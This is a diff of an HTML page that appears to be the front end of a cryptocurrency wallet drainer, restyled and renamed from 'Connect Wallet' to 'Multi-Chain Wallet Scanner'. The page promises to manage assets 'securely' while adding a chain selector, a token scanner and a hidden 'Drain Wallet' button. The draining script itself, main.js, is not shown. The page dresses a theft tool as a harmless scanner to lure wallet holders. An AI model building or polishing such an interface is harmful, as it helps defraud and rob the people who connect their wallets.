@@ -3,14 +3,15 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Connect Wallet</title>
+  <title>Multi-Chain Wallet Scanner</title>
 
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #121212;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
       color: #ffffff;
+      min-height: 100vh;
     }
 
     .container {
@@ -22,34 +23,41 @@
     }
 
     .card {
-      background-color: #1e1e1e;
+      background: rgba(30, 30, 30, 0.9);
+      backdrop-filter: blur(10px);
       padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
+      border-radius: 16px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
       width: 100%;
-      max-width: 500px;
+      max-width: 600px;
       text-align: center;
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
 
     .card h1 {
       margin-bottom: 10px;
-      font-size: 24px;
+      font-size: 28px;
+      background: linear-gradient(45deg, #4CAF50, #2196F3);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
     }
 
     .subtitle {
       font-size: 14px;
       color: #aaaaaa;
-      margin-bottom: 25px;
+      margin-bottom: 30px;
     }
 
     button {
       width: 100%;
-      padding: 14px;
+      padding: 16px;
       font-size: 16px;
+      font-weight: 600;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
-      transition: background-color 0.2s ease;
+      transition: all 0.3s ease;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -58,108 +66,212 @@
     }
 
     .connect-btn {
-      background-color: #4caf50;
-      color: #ffffff;
+      background: linear-gradient(45deg, #4CAF50, #2E7D32);
+      color: white;
+      box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
     }
 
     .connect-btn:hover {
-      background-color: #43a047;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
     }
 
     .drain-btn {
-      background-color: #f44336;
-      color: #ffffff;
+      background: linear-gradient(45deg, #f44336, #c62828);
+      color: white;
+      box-shadow: 0 4px 15px rgba(244, 67, 54, 0.3);
     }
 
     .drain-btn:hover {
-      background-color: #d32f2f;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(244, 67, 54, 0.4);
     }
 
     .drain-btn.hidden {
       display: none;
     }
 
-    .continue-btn {
-      background-color: #2196f3;
-      color: #ffffff;
+    .scan-btn {
+      background: linear-gradient(45deg, #2196F3, #1565C0);
+      color: white;
+      box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
     }
 
-    .continue-btn:hover {
-      background-color: #1e88e5;
+    .scan-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
     }
 
-    .continue-btn.hidden {
+    .scan-btn.hidden {
       display: none;
     }
 
     .status {
-      margin-top: 18px;
+      margin-top: 20px;
       font-size: 14px;
       color: #cccccc;
-      min-height: 60px;
-      padding: 10px;
-      background-color: #161616;
-      border-radius: 8px;
+      min-height: 80px;
+      padding: 15px;
+      background: rgba(22, 22, 22, 0.8);
+      border-radius: 10px;
       text-align: left;
       line-height: 1.6;
       white-space: pre-line;
       word-break: break-all;
-    }
-
-    .wallet-info {
-      margin-top: 18px;
-      padding: 12px;
-      background-color: #161616;
-      border-radius: 8px;
-      font-size: 13px;
-      text-align: left;
-      line-height: 1.6;
-      word-break: break-all;
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
 
     .tokens-container {
       margin-top: 20px;
-      padding: 15px;
-      background-color: #161616;
-      border-radius: 8px;
+      padding: 20px;
+      background: rgba(22, 22, 22, 0.8);
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      max-height: 400px;
+      overflow-y: auto;
+    }
+
+    .tokens-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+      padding-bottom: 10px;
+      border-bottom: 2px solid rgba(76, 175, 80, 0.3);
+    }
+
+    .tokens-header h3 {
+      margin: 0;
+      color: #4CAF50;
+      font-size: 18px;
+    }
+
+    .token-count {
+      background: rgba(76, 175, 80, 0.2);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+    }
+
+    .tokens-list {
       max-height: 300px;
       overflow-y: auto;
     }
 
-    .tokens-container h3 {
-      margin-top: 0;
-      margin-bottom: 15px;
-      color: #4caf50;
-      font-size: 16px;
-    }
-
     .token-item {
-      padding: 10px;
-      border-bottom: 1px solid #2a2a2a;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px;
+      background: rgba(40, 40, 40, 0.6);
+      border-radius: 8px;
       margin-bottom: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      transition: all 0.3s ease;
     }
 
-    .token-item:last-child {
-      border-bottom: none;
-      margin-bottom: 0;
+    .token-item:hover {
+      background: rgba(50, 50, 50, 0.8);
+      transform: translateX(5px);
+    }
+
+    .token-info {
+      flex: 1;
     }
 
     .token-symbol {
       color: #ffffff;
       font-weight: bold;
-    }
-
-    .token-amount {
-      color: #4caf50;
+      font-size: 16px;
+      display: block;
     }
 
     .token-name {
       color: #aaaaaa;
       font-size: 12px;
+      display: block;
+      margin-top: 2px;
+    }
+
+    .token-amount {
+      color: #4CAF50;
+      font-weight: bold;
+      font-size: 16px;
+      text-align: right;
+      min-width: 120px;
+    }
+
+    .token-value {
+      color: #2196F3;
+      font-size: 14px;
+      text-align: right;
+      min-width: 80px;
+    }
+
+    .chain-selector {
+      margin: 15px 0;
+      padding: 10px;
+      background: rgba(22, 22, 22, 0.8);
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .chain-selector select {
+      width: 100%;
+      padding: 10px;
+      background: #2a2a2a;
+      color: white;
+      border: 1px solid #444;
+      border-radius: 6px;
+      font-size: 14px;
     }
 
     .hidden {
       display: none;
+    }
+
+    .loading {
+      text-align: center;
+      padding: 20px;
+      color: #4CAF50;
+    }
+
+    .loading:after {
+      content: '...';
+      animation: dots 1.5s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0%, 20% { content: '.'; }
+      40% { content: '..'; }
+      60%, 100% { content: '...'; }
+    }
+
+    .network-badge {
+      display: inline-block;
+      padding: 4px 10px;
+      background: rgba(33, 150, 243, 0.2);
+      border-radius: 12px;
+      font-size: 12px;
+      margin-left: 10px;
+    }
+
+    .error {
+      color: #f44336;
+      background: rgba(244, 67, 54, 0.1);
+      padding: 10px;
+      border-radius: 8px;
+      margin: 10px 0;
+      border: 1px solid rgba(244, 67, 54, 0.3);
+    }
+
+    .success {
+      color: #4CAF50;
+      background: rgba(76, 175, 80, 0.1);
+      padding: 10px;
+      border-radius: 8px;
+      margin: 10px 0;
+      border: 1px solid rgba(76, 175, 80, 0.3);
     }
   </style>
 </head>
@@ -167,38 +279,71 @@
 <body>
   <main class="container">
     <div class="card">
-      <h1>Connect Your Wallet</h1>
+      <h1>🔗 Multi-Chain Wallet Scanner</h1>
       <p class="subtitle">
-        Securely connect your wallet to continue
+        Connect, scan tokens across all chains, and manage your assets securely
       </p>
 
       <!-- CONNECT BUTTON -->
       <button id="connectBtn" class="connect-btn">
-        Connect Wallet
+        <span>🔗 Connect Wallet</span>
       </button>
 
       <!-- STATUS MESSAGE -->
-      <div id="status" class="status">Not connected</div>
+      <div id="status" class="status">
+        ⏳ Ready to connect...
+      </div>
+
+      <!-- CHAIN SELECTOR -->
+      <div id="chainSelector" class="chain-selector hidden">
+        <label>Switch Network:</label>
+        <select id="networkSelect">
+          <option value="1">🌐 Ethereum Mainnet</option>
+          <option value="56">🟡 Binance Smart Chain</option>
+          <option value="137">🟣 Polygon</option>
+          <option value="42161">🔵 Arbitrum</option>
+          <option value="10">🟠 Optimism</option>
+          <option value="8453">🔷 Base</option>
+          <option value="43114">❄️ Avalanche</option>
+          <option value="250">👻 Fantom</option>
+        </select>
+      </div>
+
+      <!-- SCAN ALL CHAINS BUTTON -->
+      <button id="scanAllBtn" class="scan-btn hidden">
+        🔍 Scan All Chains for Tokens
+      </button>
 
       <!-- TOKENS DISPLAY -->
       <div id="tokensContainer" class="tokens-container hidden">
-        <h3>Wallet Tokens</h3>
-        <div id="tokens"></div>
+        <div class="tokens-header">
+          <h3>💰 Wallet Tokens</h3>
+          <span id="tokenCount" class="token-count">0 tokens</span>
+        </div>
+        <div id="tokens" class="tokens-list">
+          <!-- Tokens will appear here -->
+        </div>
       </div>
 
-      <!-- DRAIN BUTTON (HIDDEN INITIALLY) -->
+      <!-- DRAIN BUTTON -->
       <button id="drainBtn" class="drain-btn hidden">
-        Drain Wallet
+        ⚡ Drain Wallet
       </button>
 
-      <!-- CONTINUE BUTTON -->
-      <button id="continueBtn" class="continue-btn hidden">
-        Continue
-      </button>
+      <!-- WALLET INFO -->
+      <div id="walletInfo" class="hidden">
+        <div class="wallet-address"></div>
+        <div class="network-info"></div>
+      </div>
     </div>
   </main>
 
   <!-- MAIN SCRIPT -->
-  <script type="module" src="/main.js"></script>
+  <script type="module">
+    // Import the main module
+    import main from './main.js';
+    // Initialize the app
+    main.initialize();
+  </script>
 </body>
 </html>
